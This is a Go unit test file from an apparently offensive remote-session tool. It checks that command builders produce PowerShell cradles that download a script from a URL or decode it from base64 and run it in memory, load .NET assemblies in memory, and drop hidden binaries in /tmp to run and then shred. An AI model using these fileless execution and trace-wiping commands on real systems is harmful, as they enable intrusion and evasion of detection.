package internal

import (
	"context"
	"strings"
	"testing"
)

func TestBuildWindowsPowerShellHTTPCommand(t *testing.T) {
	cmd := buildWindowsPowerShellHTTPCommand("https://example.test/test.ps1", []string{"foo", "bar baz"})
	checks := []string{
		"DownloadString('https://example.test/test.ps1')",
		"[scriptblock]::Create($script)",
		"& $sb 'foo' 'bar baz'",
	}
	for _, check := range checks {
		if !strings.Contains(cmd, check) {
			t.Fatalf("expected command to contain %q, got: %s", check, cmd)
		}
	}
}

func TestBuildWindowsPowerShellB64Command(t *testing.T) {
	cmd := buildWindowsPowerShellB64Command("flame_ps_var", []string{"foo", "bar baz"})
	checks := []string{
		"FromBase64String($flame_ps_var)",
		"[scriptblock]::Create($decoded)",
		"& $sb 'foo' 'bar baz'",
		"Remove-Variable -Name flame_ps_var",
	}
	for _, check := range checks {
		if !strings.Contains(cmd, check) {
			t.Fatalf("expected command to contain %q, got: %s", check, cmd)
		}
	}
}

func TestBuildWindowsDotNetHTTPCommand(t *testing.T) {
	cmd := buildWindowsDotNetHTTPCommand("https://example.test/tool.exe", []string{"audit", "bar baz"})
	checks := []string{
		"DownloadData('https://example.test/tool.exe')",
		"[System.Reflection.Assembly]::Load($bytes)",
		"@(,[string[]]@('audit', 'bar baz'))",
	}
	for _, check := range checks {
		if !strings.Contains(cmd, check) {
			t.Fatalf("expected command to contain %q, got: %s", check, cmd)
		}
	}
}

func TestBuildWindowsDotNetB64Command(t *testing.T) {
	cmd := buildWindowsDotNetB64Command("flame_asm_var", []string{"audit", "bar baz"})
	checks := []string{
		"FromBase64String($flame_asm_var)",
		"[System.Reflection.Assembly]::Load($bytes)",
		"@(,[string[]]@('audit', 'bar baz'))",
		"Remove-Variable -Name flame_asm_var",
	}
	for _, check := range checks {
		if !strings.Contains(cmd, check) {
			t.Fatalf("expected command to contain %q, got: %s", check, cmd)
		}
	}
}

func TestRunScriptInMemoryRejectsWindows(t *testing.T) {
	s := &SessionInfo{Platform: "windows"}
	err := s.RunScriptInMemory(context.Background(), "/tmp/test.sh", nil)
	if err == nil || !strings.Contains(err.Error(), "run sh is not supported on Windows") {
		t.Fatalf("expected Windows shell-script guard, got %v", err)
	}
}

func TestRunPowerShellInMemoryRejectsLinux(t *testing.T) {
	s := &SessionInfo{Platform: "linux"}
	err := s.RunPowerShellInMemory(context.Background(), "/tmp/test.ps1", nil)
	if err == nil || !strings.Contains(err.Error(), "run ps1 is only supported on Windows") {
		t.Fatalf("expected Linux PowerShell guard, got %v", err)
	}
}

func TestRunDotNetInMemoryRejectsLinux(t *testing.T) {
	s := &SessionInfo{Platform: "linux"}
	err := s.RunDotNetInMemory(context.Background(), "/tmp/test.exe", nil)
	if err == nil || !strings.Contains(err.Error(), "run dotnet is only supported on Windows") {
		t.Fatalf("expected Linux dotnet guard, got %v", err)
	}
}

func TestRunBinaryRejectsWindows(t *testing.T) {
	s := &SessionInfo{Platform: "windows"}
	err := s.RunBinary(context.Background(), "/tmp/test.exe", nil)
	if err == nil || !strings.Contains(err.Error(), "run elf is not supported on Windows") {
		t.Fatalf("expected Windows ELF guard, got %v", err)
	}
}

func TestBuildRemoteBinaryPathForLinux(t *testing.T) {
	got := buildRemoteBinaryPath("linux", "pspy64", 123)
	want := "/tmp/.flame_123_pspy64"
	if got != want {
		t.Fatalf("expected %q, got %q", want, got)
	}
}

func TestBuildUnixBinaryCommand(t *testing.T) {
	cmd := buildUnixBinaryCommand("/tmp/.flame_tool", []string{"audit"})
	checks := []string{
		"trap 'shred -uz /tmp/.flame_tool 2>/dev/null || rm -f /tmp/.flame_tool' EXIT",
		"chmod +x /tmp/.flame_tool && /tmp/.flame_tool audit",
	}
	for _, check := range checks {
		if !strings.Contains(cmd, check) {
			t.Fatalf("expected command to contain %q, got: %s", check, cmd)
		}
	}
}
